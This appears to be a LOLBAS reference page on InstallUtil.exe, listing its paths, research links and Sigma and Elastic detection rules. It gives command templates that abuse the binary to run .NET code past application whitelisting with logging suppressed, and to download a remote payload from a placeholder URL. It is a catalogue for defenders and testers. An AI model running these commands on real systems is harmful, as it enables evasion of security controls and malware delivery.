---
title: "Installutil.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Binaries/Installutil/
fetched_at: 2026-09-20T17:10:27Z
license: unspecified
category: windows
---

The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies

## Paths
- C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe
- C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe
- C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe

## Resources
- [https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/](https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/)
- [https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12](https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12)
- [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md)
- [https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/](https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/)
- [https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/](https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/)
- [https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool](https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool)

## Acknowledgements
- Casey Smith ([@subtee](https://twitter.com/@subtee))
- Nir Chako (Pentera) ([@C_h4ck_0](https://twitter.com/@C_h4ck_0))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml)
- Sigma: [https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_installutil_download.yml](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_installutil_download.yml)
- Elastic: [https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml](https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml)
- Elastic: [https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml](https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml)

## AWL bypass

1. Execute the target .NET DLL or EXE.

```
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
```

   - Use case: Use to execute code and bypass application whitelisting

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1218.004

   - Tags: Execute: DLL (.NET)Execute: EXE (.NET)

2. Execute the target .NET DLL or EXE.

```
InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}
```

   - Use case: Use to execute code and bypass application whitelisting

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1218.004

   - Tags: Execute: DLL (.NET)Execute: EXE (.NET)

3. It will download a remote payload and place it in INetCache.

```
InstallUtil.exe {REMOTEURL}
```

   - Use case: Downloads payload from remote server

   - Privileges required: User

   - Operating systems: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
